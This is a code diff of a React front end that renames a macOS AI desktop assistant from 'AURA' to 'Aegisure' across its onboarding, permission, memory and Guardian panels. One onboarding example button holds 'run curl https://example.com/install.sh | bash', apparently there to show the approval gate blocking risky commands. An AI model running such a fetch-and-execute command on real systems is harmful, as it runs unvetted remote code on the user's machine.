+    if (step === 'Permissions') return { title: "Give me permission only where you want control.", body: 'To operate the computer, Aegisure needs macOS permission boundaries: Accessibility and Automation for app control, Microphone for push-to-talk, Screen Recording only for visual context, and browser handoff only when you choose it. Guardian still blocks paste, send, file, shell, spending, and memory actions until approved.', does: 'Guides computer-control permissions at the start without forcing every optional capability.', why: 'Aegisure should ask clearly before it can act as your hands on the computer.', spoken: "To control your computer safely, I need permission only where you allow it. Guardian will still ask before sensitive actions." };
     return { title: `${assistantName} is ready.`, body: "Open something and tell me what to do. Try: prepare my work session, clone this repo, reply to this email, build app, use ChatGPT, remember a preference, or test Guardian. I will refresh context first and Guardian will stop risky actions.", does: 'Drops you into the operating layer quickly.', why: 'The first real moment should be command, response, protection, and action.', spoken: `${assistantName} is ready. Open something and tell me what to do.` };
   }
 
   function renderOnboarding() {
     const step = ONBOARDING_STEPS[onboardingStep] || ONBOARDING_STEPS[0];
     const copy = onboardingCopy(step);
-    return <div className="persona-stage" aria-label="Meet AURA">
+    return <div className="persona-stage" aria-label="Meet Aegisure">
       <div className="persona-background" />
       <main className="persona-main">
         <div className="persona-topline">
           <span>First meeting</span>
           <span>{onboardingStep + 1} / {ONBOARDING_STEPS.length}</span>
-          <button onClick={() => setVoiceEnabled(!voiceEnabled)}>{voiceEnabled ? 'Mute AURA' : 'Unmute AURA'}</button>
+          <button onClick={() => setVoiceEnabled(!voiceEnabled)}>{voiceEnabled ? 'Mute Aegisure' : 'Unmute Aegisure'}</button>
           <button onClick={() => speak(copy.spoken || copy.body)}>Replay message</button>
         </div>
         <div className="persona-encounter">
@@ -1236,7 +1236,7 @@ export default function App() {
         </div>
 
         <section className="conversation-choice-panel">
-          {step === 'Rename AURA' && <div className="rename-panel conversational-control">
+          {step === 'Rename Aegisure' && <div className="rename-panel conversational-control">
             <label>Your display name<input aria-label="user display name" value={onboardingPrefs.userDisplayName} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, userDisplayName: e.target.value })} placeholder={profileStatus?.display_name || 'Hetul'} /></label>
             <label>What would you like to call me?<input aria-label="assistant name" value={draftAssistantName} onChange={e => setDraftAssistantName(e.target.value)} placeholder="Alice" /></label>
             <label>What should my personality feel like?<input aria-label="assistant personality" value={onboardingPrefs.personality} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, personality: e.target.value })} placeholder="calm, capable, concise" /></label>
@@ -1252,7 +1252,7 @@ export default function App() {
           {step === 'Guardian' && <div className="persona-stack watchtower-onboarding"><GuardianWatchtower guardianEvents={guardianEvents} guardianLedger={guardianLedger} guardianPolicy={guardianPolicy} guardianCoverage={guardianCoverage} pendingApproval={pendingApproval} panic={() => panicStop(runId)} runId={runId} updatePolicy={async (patch) => { setGuardianPolicy(await updateGuardianPolicy(patch)); await refreshKnowledge(); }} /></div>}
           {step === 'Memory and Identity' && <div className="persona-stack">
             <div className="onboarding-preferences">
-              <label><input type="checkbox" checked={onboardingPrefs.memoryConsent} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, memoryConsent: e.target.checked })} /> Allow AURA to remember safe preferences and workflows after showing you what it learned.</label>
+              <label><input type="checkbox" checked={onboardingPrefs.memoryConsent} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, memoryConsent: e.target.checked })} /> Allow Aegisure to remember safe preferences and workflows after showing you what it learned.</label>
               <label><input type="checkbox" checked={onboardingPrefs.preferLocalMode} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, preferLocalMode: e.target.checked })} /> Prefer local/private mode when it can still do the job.</label>
               <label>Guardian protection level<select value={onboardingPrefs.guardianLevel} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, guardianLevel: e.target.value })}><option value="balanced">Balanced approvals</option><option value="strict">Strict approvals</option></select></label>
             </div>
@@ -1265,8 +1265,8 @@ export default function App() {
             <p>ChatGPT and Claude handoff are optional. I will not spend money or paste into another app without approval.</p>
           </div>}
           {step === 'Workspace' && <div className="rename-panel conversational-control">
-            <label>Workspace folder<input aria-label="workspace folder" value={onboardingPrefs.workspace} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, workspace: e.target.value })} placeholder="~/AURA/workspaces" /></label>
-            <button className="primary-button" onClick={() => setOnboardingPrefs({ ...onboardingPrefs, workspace: '~/AURA/workspaces' })}>Use default</button>
+            <label>Workspace folder<input aria-label="workspace folder" value={onboardingPrefs.workspace} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, workspace: e.target.value })} placeholder="~/Aegisure/workspaces" /></label>
+            <button className="primary-button" onClick={() => setOnboardingPrefs({ ...onboardingPrefs, workspace: '~/Aegisure/workspaces' })}>Use default</button>
           </div>}
           {step === 'Local Brain' && <div className="persona-details slim"><ModelStatusPanel localModelStatus={localModelStatus} modelError={modelError} selectedLocalModel={selectedLocalModel} setSelected={(value) => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: value })} approveAndPullLocalModel={approveAndPullLocalModel} startLocalModelRuntime={startLocalModelRuntimeFromUi} selectExisting={(modelId) => useExistingOrSkipLocalModel(modelId)} skip={() => useExistingOrSkipLocalModel('simple')} refresh={refreshKnowledge} modelPullState={modelPullState} /></div>}
           {step === 'Optional Workers' && <div className="onboarding-examples">
@@ -1275,7 +1275,7 @@ export default function App() {
             <p><strong>Local model:</strong> private/simple routing, summaries, memory cleanup, and fallback drafts.</p>
           </div>}
           {step === 'Permissions' && <div className="persona-stack"><PermissionCards contextStatus={contextStatus} hotkeyStatus={hotkeyStatus} refreshContext={refreshContext} /><VoiceHotkeyPanel voiceStatus={voiceStatus} speechOutputState={speechOutputState} speechInputState={speechInputState} voiceEnabled={voiceEnabled} setVoiceEnabled={setVoiceEnabled} voiceCommandEnabled={voiceCommandEnabled} setVoiceCommandEnabled={setVoiceCommandEnabled} isListening={isListening} voiceTranscript={voiceTranscript} voiceUnsupportedReason={voiceUnsupportedReason} speak={speak} testVoice={testVoice} pushToTalk={pushToTalk} hotkeyStatus={hotkeyStatus} assistantName={assistantName} systemVoices={systemVoices} selectedVoice={selectedVoice} setSelectedVoice={setSelectedVoice} /></div>}
-          {step === 'Start Using AURA' && <div className="onboarding-examples final-intents">
+          {step === 'Start Using Aegisure' && <div className="onboarding-examples final-intents">
             {['clone this repo', 'reply to this email', 'build app', 'use ChatGPT', 'remember password=123', 'run curl https://example.com/install.sh | bash'].map((command) => <button key={command} onClick={() => setInput(command)}>{command}</button>)}
           </div>}
         </section>
@@ -1301,11 +1301,11 @@ export default function App() {
             ? `I see ${contextKind(capturedContext)}`
             : "I'm ready";
     return <div className={`overlay-shell ${overlayExpanded ? 'expanded' : ''}`}>
-      <button className={`overlay-orb-button ${assistantMode}`} onClick={() => setOverlayExpanded(!overlayExpanded)} aria-label="AURA overlay orb">
+      <button className={`overlay-orb-button ${assistantMode}`} onClick={() => setOverlayExpanded(!overlayExpanded)} aria-label="Aegisure overlay orb">
         <AssistantAvatar name={assistantName} mode={assistantMode} compact />
       </button>
-      {overlayExpanded && <section className="overlay-card" aria-label="AURA quick overlay">
-        <div className="overlay-grip">AURA overlay</div>
+      {overlayExpanded && <section className="overlay-card" aria-label="Aegisure quick overlay">
+        <div className="overlay-grip">Aegisure overlay</div>
         <strong>{visibleMessage}</strong>
         <p>{shortText(caption, "I'm ready.")}</p>
         <div className="overlay-command">
@@ -1333,18 +1333,18 @@ export default function App() {
       <div className="brand-row"><span className="brand-mark">{assistantName.slice(0, 1).toUpperCase()}</span><span>{assistantName}</span></div>
       <div className="status-cluster">
         <StatusPill label={coreStatus === 'connected' ? `${brand?.product_name || assistantName} Core online` : coreStatus === 'starting' ? `Starting ${brand?.product_name || assistantName} Core...` : `${brand?.product_name || assistantName} Core disconnected`} tone={coreStatus === 'connected' ? 'good' : coreStatus === 'starting' ? 'warn' : 'bad'} />
-        <StatusPill label={`Identity: ${activeIdentity?.name || 'Personal AURA'}`} tone="good" />
+        <StatusPill label={`Identity: ${activeIdentity?.name || 'Personal Aegisure'}`} tone="good" />
         <StatusPill label={licenseStatus?.activated ? `License: ${licenseStatus.tier}` : 'License: local alpha'} tone={licenseStatus?.activated ? 'good' : 'warn'} />
         <StatusPill label={hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey needs Accessibility'} tone={hotkeyStatus.ok ? 'good' : 'warn'} />
         <StatusPill label={localReady ? `Local: ${selectedModelId || 'ready'}` : 'Local optional'} tone={localReady ? 'good' : 'warn'} />
         <button className="ghost-button" onClick={() => window.auraDesktop?.showOverlay?.()}>Show overlay</button>
-        <button className="ghost-button" onClick={testVoice}>Test AURA voice</button>
+        <button className="ghost-button" onClick={testVoice}>Test Aegisure voice</button>
         <button className="ghost-button" onClick={restartOnboarding}>Restart onboarding</button>
       </div>
     </header>
 
     <main className="presence-shell">
-      <section className="presence-home" aria-label="AURA presence">
+      <section className="presence-home" aria-label="Aegisure presence">
         <div className="presence-orbit">
           <AssistantAvatar name={assistantName} mode={assistantMode} />
         </div>
@@ -1393,7 +1393,7 @@ export default function App() {
         </aside>
       </section>
 
-      <section className="helper-now-section" aria-label="What AURA can do right now">
+      <section className="helper-now-section" aria-label="What Aegisure can do right now">
         <div className="stream-heading">
           <span>What {assistantName} can do right now</span>
           <strong>{contextKind(capturedContext) === 'none' ? 'Ask directly, or open context first' : 'Context-aware actions ready'}</strong>
@@ -1401,13 +1401,13 @@ export default function App() {
         <ContextActionCards cards={contextActions} startAction={startAction} coreOnline={coreStatus === 'connected'} contextKindValue={contextKind(capturedContext)} assistantName={assistantName} />
       </section>
 
-      <section className="companion-grid" aria-label="AURA continuity and connectors">
+      <section className="companion-grid" aria-label="Aegisure continuity and connectors">
         <MemoryInsightPanel memoryItems={memoryItems} memoryInbox={memoryInbox} activeIdentity={activeIdentity} />
         <AIConnectorPanel tools={userTools} privacyCheck={privacyCheck} runPrivacyCheck={runPrivacyCheckForTool} chooseCommand={chooseCommand} />
       </section>
 
-      <section className="product-status-grid" aria-label="AURA product status">
-        <Metric label="AURA Status" value={coreStatus === 'connected' ? 'Online' : 'Needs Core'} />
+      <section className="product-status-grid" aria-label="Aegisure product status">
+        <Metric label="Aegisure Status" value={coreStatus === 'connected' ? 'Online' : 'Needs Core'} />
         <Metric label="Memory Status" value={`${memoryHealth?.active_memories || 0} active`} />
         <Metric label="Guardian" value={guardianPolicy?.mode || 'balanced'} />
         <Metric label="Last Action" value={identityLedger[0]?.summary ? shortText(identityLedger[0].summary, 'Ledger ready') : 'Ready'} />
@@ -1424,8 +1424,8 @@ export default function App() {
       {advancedOpen && <section className="panel-body advanced-diagnostics">
         <details className="glass-panel"><summary>Settings</summary><BrandLicensePanel brand={brand} licenseStatus={licenseStatus} licenseToken={licenseToken} setLicenseToken={setLicenseToken} licenseNotice={licenseNotice} activateLicense={activateLicenseFromUi} saveBrandName={saveBrandName} /><VoiceHotkeyPanel voiceStatus={voiceStatus} speechOutputState={speechOutputState} speechInputState={speechInputState} voiceEnabled={voiceEnabled} setVoiceEnabled={setVoiceEnabled} voiceCommandEnabled={voiceCommandEnabled} setVoiceCommandEnabled={setVoiceCommandEnabled} isListening={isListening} voiceTranscript={voiceTranscript} voiceUnsupportedReason={voiceUnsupportedReason} speak={speak} testVoice={testVoice} pushToTalk={pushToTalk} hotkeyStatus={hotkeyStatus} assistantName={assistantName} systemVoices={systemVoices} selectedVoice={selectedVoice} setSelectedVoice={setSelectedVoice} /><ModelStatusPanel localModelStatus={localModelStatus} modelError={modelError} selectedLocalModel={selectedLocalModel} setSelected={(value) => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: value })} approveAndPullLocalModel={approveAndPullLocalModel} startLocalModelRuntime={startLocalModelRuntimeFromUi} selectExisting={(modelId) => useExistingOrSkipLocalModel(modelId)} skip={() => useExistingOrSkipLocalModel('simple')} refresh={refreshKnowledge} modelPullState={modelPullState} /></details>
         <details className="glass-panel"><summary>Memory</summary><MemoryConsole memoryItems={memoryItems} memoryInbox={memoryInbox} memoryHealth={memoryHealth} memoryEditor={memoryEditor} setMemoryEditor={setMemoryEditor} memoryNotice={memoryNotice} saveMemory={saveMemoryFromUi} updateMemory={updateMemoryFromUi} deleteMemory={deleteMemoryFromUi} keepInbox={keepMemoryFromInbox} forgetInbox={forgetMemoryFromInbox} activeIdentity={activeIdentity} /><button onClick={async () => { const r = await compactMemory(activeIdentity?.memory_scope || 'personal'); setOut(JSON.stringify(r, null, 2)); await refreshKnowledge(); }}>Compact active identity memory</button></details>
-        <details className="glass-panel"><summary>Workflows</summary><Feed items={workflowSuggestions.length ? workflowSuggestions.map((item: any) => ({ title: item.suggested_workflow_name || 'Workflow suggestion', detail: item.command_template || item.task_type || 'Workflow signal' })) : [{ title: 'No workflow suggestions yet', detail: 'AURA will suggest repeatable workflows after useful runs.' }]} /><div className="metric-grid"><Metric label="Runs" value={events.length || 0} /><Metric label="Approvals" value={approvalsHandled} /><Metric label="Workflows" value={workflowsReplayed} /><Metric label="Blocked" value={blockedCount} /></div></details>
-        <details className="glass-panel"><summary>Use AURA with other AI tools</summary><AIConnectorPanel tools={userTools} privacyCheck={privacyCheck} runPrivacyCheck={runPrivacyCheckForTool} chooseCommand={chooseCommand} /><ExternalAgentPanel status={externalAgents} /></details>
+        <details className="glass-panel"><summary>Workflows</summary><Feed items={workflowSuggestions.length ? workflowSuggestions.map((item: any) => ({ title: item.suggested_workflow_name || 'Workflow suggestion', detail: item.command_template || item.task_type || 'Workflow signal' })) : [{ title: 'No workflow suggestions yet', detail: 'Aegisure will suggest repeatable workflows after useful runs.' }]} /><div className="metric-grid"><Metric label="Runs" value={events.length || 0} /><Metric label="Approvals" value={approvalsHandled} /><Metric label="Workflows" value={workflowsReplayed} /><Metric label="Blocked" value={blockedCount} /></div></details>
+        <details className="glass-panel"><summary>Use Aegisure with other AI tools</summary><AIConnectorPanel tools={userTools} privacyCheck={privacyCheck} runPrivacyCheck={runPrivacyCheckForTool} chooseCommand={chooseCommand} /><ExternalAgentPanel status={externalAgents} /></details>
         <details className="glass-panel"><summary>OS Guardian Foundation</summary><OSGuardianFoundation hotkeyStatus={hotkeyStatus} contextStatus={contextStatus} refreshContext={refreshContext} /></details>
         <details className="glass-panel"><summary>Private alpha demo checks</summary><PrivateAlphaDemoPanel runCommand={chooseCommand} startCommand={async (command: string) => { setInput(command); await executeCommand(command); }} testVoice={testVoice} showOverlay={() => window.auraDesktop?.showOverlay?.()} createMemoryCandidate={createMemoryInboxFromUi} refresh={refreshKnowledge} /></details>
         <details className="glass-panel" open><summary>Diagnostics / Freshness</summary><p>Build ID: {buildLabel}</p><p>Backend URL: {BACKEND_URL}</p><p>Installed app path: {diagnostics?.installedAppPath || '-'}</p><p>Profile path: {diagnostics?.profilePath || '~/.aura'}</p><p>App data path: {diagnostics?.userDataPath || '-'}</p><p>Logs: {logsPath || diagnostics?.logsPath || '-'}</p><p>Backend command: {diagnostics?.backend?.command || '-'}</p><p>License server: {launchStatus?.launch_services?.license_server_configured ? launchStatus.launch_services.license_server_url : 'not configured'}</p><p>Update channel: {updateStatus?.channel || 'manual'} / {updateStatus?.artifact_ready ? 'download ready' : updateStatus?.status || 'not checked'}</p><p>Latest version: {updateStatus?.version || '-'} {updateStatus?.update_available ? '(update available)' : ''}</p><p>Crash reporting: {launchStatus?.launch_services?.crash_reporting_configured ? 'configured' : 'local redacted reports only'}</p><p>Reset app state: run `scripts/reset-aura-local.sh` from the repo root. It asks first and archives local state by default.</p><button onClick={refreshDiagnostics}>Refresh diagnostics</button><button onClick={async () => setLogsPath(window.auraDesktop?.openLogs ? await window.auraDesktop.openLogs() : 'No desktop bridge.')}>Open logs folder</button><button onClick={sendTestCrashReport}>Send redacted test crash report</button>{crashReportState && <p className="helper-text">{crashReportState}</p>}</details>
@@ -1435,7 +1435,7 @@ export default function App() {
       </section>}
     </main>
 
-    <footer className="footer-line">AURA Core: {coreStatus}. Guardian: protected. Wake word: not implemented. Build: {buildLabel}.</footer>
+    <footer className="footer-line">Aegisure Core: {coreStatus}. Guardian: protected. Wake word: not implemented. Build: {buildLabel}.</footer>
   </div>;
 }
 
@@ -1482,12 +1482,12 @@ function GuardianPromise() {
 
 function PermissionCards(props: { contextStatus: string; hotkeyStatus: { ok: boolean; accelerator: string; error?: string }; refreshContext: () => void }) {
   const permissions = [
-    { name: 'Accessibility', use: 'Bring AURA forward, capture app context, and control apps when approved.', never: 'Never controls apps silently.', status: props.hotkeyStatus.ok ? 'Likely enabled' : 'May be needed for hotkey/control', enable: 'System Settings > Privacy & Security > Accessibility, then enable AURA or Electron.', without: 'Typed commands, memory, identity, and Guardian command checks still work.' },
-    { name: 'Automation', use: 'macOS may ask before AURA interacts with another app.', never: 'Never sends, pastes, or clicks through approval gates.', status: 'Requested per app by macOS', enable: 'macOS prompts per target app the first time AURA requests control.', without: 'AURA can prepare drafts and prompts, but may ask you to copy/paste manually.' },
-    { name: 'Microphone', use: 'Push-to-talk permission check and future voice input.', never: 'No always-listening wake word in this build.', status: 'Optional', enable: 'System Settings > Privacy & Security > Microphone.', without: 'You can type commands and AURA can still speak responses.' },
-    { name: 'Screen Recording', use: 'Visual context only when needed.', never: 'Never stores screenshots as memory without permission.', status: 'Optional until visual context is enabled', enable: 'System Settings > Privacy & Security > Screen Recording.', without: 'AURA uses app names, browser URLs, selected text, and clipboard fallback where available.' },
-    { name: 'Full Disk Access', use: 'Broad file help when you explicitly ask AURA to inspect files outside the workspace.', never: 'Never scans your whole disk by default.', status: 'Advanced / optional', enable: 'System Settings > Privacy & Security > Full Disk Access.', without: 'Workspace-safe file operations still work.' },
-    { name: 'Browser handoff', use: 'Prepare ChatGPT/Claude/Codex/Cursor prompts or read current URL when available.', never: 'Never claims page context it cannot see.', status: 'Optional', enable: 'Grant browser automation only when macOS asks, or paste the URL/text into AURA.', without: 'Manual handoff prompts still work with pasted context.' },
+    { name: 'Accessibility', use: 'Bring Aegisure forward, capture app context, and control apps when approved.', never: 'Never controls apps silently.', status: props.hotkeyStatus.ok ? 'Likely enabled' : 'May be needed for hotkey/control', enable: 'System Settings > Privacy & Security > Accessibility, then enable Aegisure or Electron.', without: 'Typed commands, memory, identity, and Guardian command checks still work.' },
+    { name: 'Automation', use: 'macOS may ask before Aegisure interacts with another app.', never: 'Never sends, pastes, or clicks through approval gates.', status: 'Requested per app by macOS', enable: 'macOS prompts per target app the first time Aegisure requests control.', without: 'Aegisure can prepare drafts and prompts, but may ask you to copy/paste manually.' },
+    { name: 'Microphone', use: 'Push-to-talk permission check and future voice input.', never: 'No always-listening wake word in this build.', status: 'Optional', enable: 'System Settings > Privacy & Security > Microphone.', without: 'You can type commands and Aegisure can still speak responses.' },
+    { name: 'Screen Recording', use: 'Visual context only when needed.', never: 'Never stores screenshots as memory without permission.', status: 'Optional until visual context is enabled', enable: 'System Settings > Privacy & Security > Screen Recording.', without: 'Aegisure uses app names, browser URLs, selected text, and clipboard fallback where available.' },
+    { name: 'Full Disk Access', use: 'Broad file help when you explicitly ask Aegisure to inspect files outside the workspace.', never: 'Never scans your whole disk by default.', status: 'Advanced / optional', enable: 'System Settings > Privacy & Security > Full Disk Access.', without: 'Workspace-safe file operations still work.' },
+    { name: 'Browser handoff', use: 'Prepare ChatGPT/Claude/Codex/Cursor prompts or read current URL when available.', never: 'Never claims page context it cannot see.', status: 'Optional', enable: 'Grant browser automation only when macOS asks, or paste the URL/text into Aegisure.', without: 'Manual handoff prompts still work with pasted context.' },
   ];
   return <div className="permission-grid">{permissions.map((permission) => <article className="permission-card" key={permission.name}>
     <span>{permission.status}</span>
@@ -1514,8 +1514,8 @@ function Feed(props: { items: Array<{ kind?: string; title: string; detail?: str
 function ConversationStream(props: { messages: ConversationMessage[]; fallbackItems: Array<{ kind?: string; title: string; detail?: string }>; assistantName: string }) {
   const messages = props.messages.length
     ? props.messages
-    : props.fallbackItems.slice(0, 5).map((item) => ({ speaker: item.kind?.includes('guardian') ? 'Guardian' : 'AURA', text: `${item.title}. ${item.detail || ''}`, tone: item.kind || 'notice' } as ConversationMessage));
-  return <section className="conversation-stream" aria-label="AURA conversation">
+    : props.fallbackItems.slice(0, 5).map((item) => ({ speaker: item.kind?.includes('guardian') ? 'Guardian' : 'Aegisure', text: `${item.title}. ${item.detail || ''}`, tone: item.kind || 'notice' } as ConversationMessage));
+  return <section className="conversation-stream" aria-label="Aegisure conversation">
     <div className="stream-heading">
       <span>Conversation</span>
       <strong>{props.assistantName} remembers this session</strong>
@@ -1558,14 +1558,14 @@ function ContextSummary(props: { assistantName: string; context: any; currentUrl
 }
 
 function BrandLicensePanel(props: { brand: any; licenseStatus: any; licenseToken: string; setLicenseToken: (value: string) => void; licenseNotice: string; activateLicense: () => void; saveBrandName: (name: string) => void }) {
-  const [brandDraft, setBrandDraft] = useState(props.brand?.product_name || 'AURA');
+  const [brandDraft, setBrandDraft] = useState(props.brand?.product_name || 'Aegisure');
   useEffect(() => {
-    setBrandDraft(props.brand?.product_name || 'AURA');
+    setBrandDraft(props.brand?.product_name || 'Aegisure');
   }, [props.brand?.product_name]);
   return <div className="brand-license-grid">
     <section className="glass-panel">
       <span>Brand control</span>
-      <strong>{props.brand?.product_name || 'AURA'}</strong>
+      <strong>{props.brand?.product_name || 'Aegisure'}</strong>
       <p>Rename the product shell without changing the underlying Helper, Guardian, Memory, and Identity architecture.</p>
       <div className="license-row">
         <input aria-label="product name" value={brandDraft} onChange={(e) => setBrandDraft(e.target.value)} placeholder="New company/app name" />
@@ -1591,12 +1591,12 @@ function IdentityCard(props: { identities: any[]; activeIdentity: any; attestati
   const scopes = asArray(metadata.allowed_memory_scopes).join(', ') || active.memory_scope || 'personal';
   const key = props.attestation?.key || {};
   const ledger = asArray(props.ledger).filter((item) => !item.identity_id || item.identity_id === active.identity_id).slice(0, 3);
-  return <section className="identity-card" aria-label="AURA identity">
+  return <section className="identity-card" aria-label="Aegisure identity">
     <div className="stream-heading">
-      <span>AURA Identity</span>
-      <strong>{active.name || 'Personal AURA'}</strong>
+      <span>Aegisure Identity</span>
+      <strong>{active.name || 'Personal Aegisure'}</strong>
     </div>
-    <p>AURA is acting under <strong>{active.identity_id || 'personal'}</strong>. Memory scope: <strong>{active.memory_scope || 'personal'}</strong>.</p>
+    <p>Aegisure is acting under <strong>{active.identity_id || 'personal'}</strong>. Memory scope: <strong>{active.memory_scope || 'personal'}</strong>.</p>
     <p className="helper-text">Allowed memory scopes: {scopes}. Signing: {key.fingerprint ? `Ed25519 active (${key.fingerprint})` : 'creating local key...'}.</p>
     <p className="helper-text">Private key is encrypted at rest with a local master key. Hardware-bound identity sync is a server-side next step, not claimed yet.</p>
     <div className="identity-switcher">
@@ -1604,7 +1604,7 @@ function IdentityCard(props: { identities: any[]; activeIdentity: any; attestati
     </div>
     <div className="identity-ledger">
       <span>Identity Ledger</span>
-      {ledger.length ? ledger.map((entry) => <p key={entry.ledger_id || entry.summary}>{entry.summary}</p>) : <p>AURA will record useful actions under this identity.</p>}
+      {ledger.length ? ledger.map((entry) => <p key={entry.ledger_id || entry.summary}>{entry.summary}</p>) : <p>Aegisure will record useful actions under this identity.</p>}
     </div>
   </section>;
 }
@@ -1619,9 +1619,9 @@ function MemoryConsole(props: { memoryItems: any[]; memoryInbox?: any[]; memoryH
     .filter((item) => kindFilter === 'all' || item.kind === kindFilter)
     .filter((item) => !query.trim() || `${item.memory_key} ${item.value} ${item.kind} ${asArray(item.tags).join(' ')}`.toLowerCase().includes(query.toLowerCase()))
     .slice(0, 16);
-  return <section className="memory-console" aria-label="AURA Memory">
+  return <section className="memory-console" aria-label="Aegisure Memory">
     <div className="stream-heading">
-      <span>AURA Memory</span>
+      <span>Aegisure Memory</span>
       <strong>{items.length ? `${items.length} memories in ${scope}` : `No visible memories in ${scope}`}</strong>
     </div>
     <div className="memory-editor">
@@ -1653,26 +1653,26 @@ function MemoryConsole(props: { memoryItems: any[]; memoryInbox?: any[]; memoryH
         <span>{item.kind} / {item.scope} / candidate</span>
         <strong>{String(item.memory_key || 'candidate').replace(/[_:.]+/g, ' ')}</strong>
         <p>{shortText(item.value, 'No value')}</p>
-        <p className="helper-text">{item.metadata?.why_it_matters || 'AURA learned this and is waiting for your decision.'}</p>
+        <p className="helper-text">{item.metadata?.why_it_matters || 'Aegisure learned this and is waiting for your decision.'}</p>
         <div className="panel-actions">
           <button onClick={() => props.keepInbox(item.memory_id, { pinned: true })}>Keep</button>
           <button onClick={() => props.keepInbox(item.memory_id, { value: item.value, pinned: true })}>Keep + pin</button>
           <button onClick={() => props.forgetInbox(item.memory_id)}>Forget</button>
         </div>
-      </article>) : <p className="helper-text">No pending memory candidates. Tell AURA: “remember I prefer concise technical explanations.”</p>}
+      </article>) : <p className="helper-text">No pending memory candidates. Tell Aegisure: “remember I prefer concise technical explanations.”</p>}
     </div>
     <div className="memory-card-list">
       {items.length ? items.map((item) => <article className="memory-card" key={item.memory_id}>
         <span>{item.kind} / {item.scope} / {Math.round(Number(item.confidence || 0) * 100)}%</span>
         <strong>{String(item.memory_key || 'memory').replace(/[_:.]+/g, ' ')}</strong>
         <p>{shortText(item.value, 'No value')}</p>
-        <p className="helper-text">Learned from {item.source || item.provenance?.source || 'AURA'} on {String(item.created_at || '').slice(0, 10)}. Used {item.usage_count || 0} times. {item.metadata?.why_it_matters || item.provenance?.explanation || 'User-owned local memory.'}</p>
+        <p className="helper-text">Learned from {item.source || item.provenance?.source || 'Aegisure'} on {String(item.created_at || '').slice(0, 10)}. Used {item.usage_count || 0} times. {item.metadata?.why_it_matters || item.provenance?.explanation || 'User-owned local memory.'}</p>
         <div className="panel-actions">
           <button onClick={() => props.updateMemory(item.memory_id, { pinned: !item.pinned })}>{item.pinned ? 'Unpin' : 'Pin'}</button>
           <button onClick={() => props.updateMemory(item.memory_id, { value: prompt('Edit memory', item.value || '') || item.value })}>Edit</button>
           <button onClick={() => props.deleteMemory(item.memory_id)}>Archive</button>
         </div>
-      </article>) : <div className="feed-item empty"><div className="feed-dot" /><div><strong>Memory inbox is ready.</strong><p>Tell AURA: "remember that I prefer concise technical explanations."</p></div></div>}
+      </article>) : <div className="feed-item empty"><div className="feed-dot" /><div><strong>Memory inbox is ready.</strong><p>Tell Aegisure: "remember that I prefer concise technical explanations."</p></div></div>}
     </div>
   </section>;
 }
@@ -1692,7 +1692,7 @@ function GuardianWatchtower(props: { guardianEvents: any[]; guardianLedger?: any
   const feed = realEvents.length ? realEvents : WATCHTOWER_EXAMPLES;
   return <section className="guardian-watchtower" aria-label="Guardian Watchtower">
     <div className="watchtower-header">
-      <span>AURA Guardian</span>
+      <span>Aegisure Guardian</span>
       <strong>{props.pendingApproval ? 'Approval required' : `Watchtower active (${props.guardianPolicy?.mode || 'balanced'})`}</strong>
     </div>
     <div className="guardian-policy-controls">
@@ -1728,14 +1728,14 @@ function PrivateAlphaDemoPanel(props: { runCommand: (command: string) => void; s
     { label: 'Test secret memory rejection', command: 'remember my password is test123' },
     { label: 'Test Identity Boundary', command: 'remember personal memory in work scope: I prefer private weekend notes' },
     { label: 'Prepare Work Session', command: 'prepare my work session' },
-    { label: 'Clone pasted GitHub repo', command: 'clone https://github.com/Hetul803/AURA' },
+    { label: 'Clone pasted GitHub repo', command: 'clone https://github.com/Hetul803/Aegisure' },
     { label: 'Create coding job', command: 'build app: make a tiny notes app with local storage' },
-    { label: 'Draft with memory', command: 'draft a message explaining AURA' },
-    { label: 'Open URL', command: 'open https://github.com/Hetul803/AURA' },
-    { label: 'Create note', command: 'create note: AURA private alpha is ready for feedback' },
+    { label: 'Draft with memory', command: 'draft a message explaining Aegisure' },
+    { label: 'Open URL', command: 'open https://github.com/Hetul803/Aegisure' },
+    { label: 'Create note', command: 'create note: Aegisure private alpha is ready for feedback' },
   ];
   return <section className="demo-panel" aria-label="private alpha demo checks">
-    <p className="helper-text">These buttons run real AURA-managed paths for private-alpha verification. They are tucked away so the main product still feels like an operating layer.</p>
+    <p className="helper-text">These buttons run real Aegisure-managed paths for private-alpha verification. They are tucked away so the main product still feels like an operating layer.</p>
     <div className="context-action-grid">
       {checks.map((check) => <article className="context-action-card" key={check.label}>
         <h3>{check.label}</h3>
@@ -1786,12 +1786,12 @@ function MemoryInsightPanel(props: { memoryItems: any[]; memoryInbox?: any[]; ac
     return acc;
   }, {});
   const featured = visible.slice(0, 3);
-  return <section className="memory-insight-panel" aria-label="What AURA knows about me">
+  return <section className="memory-insight-panel" aria-label="What Aegisure knows about me">
     <div className="stream-heading">
-      <span>What AURA knows about me</span>
+      <span>What Aegisure knows about me</span>
       <strong>{visible.length ? `${visible.length} active memories` : 'Ready to learn'}</strong>
     </div>
-    <p className="helper-text">Memory is local, user-owned, identity-scoped, and only shown here when it helps the user understand why AURA behaves a certain way.</p>
+    <p className="helper-text">Memory is local, user-owned, identity-scoped, and only shown here when it helps the user understand why Aegisure behaves a certain way.</p>
     <div className="knowledge-grid">
       {['Preference', 'Project', 'Workflow', 'Person', 'Safety', 'Writing style'].map((kind) => <div className="knowledge-tile" key={kind}>
         <span>{kind}</span>
@@ -1802,11 +1802,11 @@ function MemoryInsightPanel(props: { memoryItems: any[]; memoryInbox?: any[]; ac
       {featured.length ? featured.map((item) => <article className="memory-used-card" key={item.memory_id || item.memory_key}>
         <span>{memoryKindLabel(item.kind)} / {item.scope || scope}</span>
         <strong>{shortText(item.value, item.memory_key || 'Memory')}</strong>
-        <p>{item.metadata?.why_it_matters || item.provenance?.explanation || `This belongs to ${props.activeIdentity?.name || 'Personal AURA'} and can shape future drafts, workflows, and Guardian decisions.`}</p>
+        <p>{item.metadata?.why_it_matters || item.provenance?.explanation || `This belongs to ${props.activeIdentity?.name || 'Personal Aegisure'} and can shape future drafts, workflows, and Guardian decisions.`}</p>
       </article>) : <article className="memory-used-card empty">
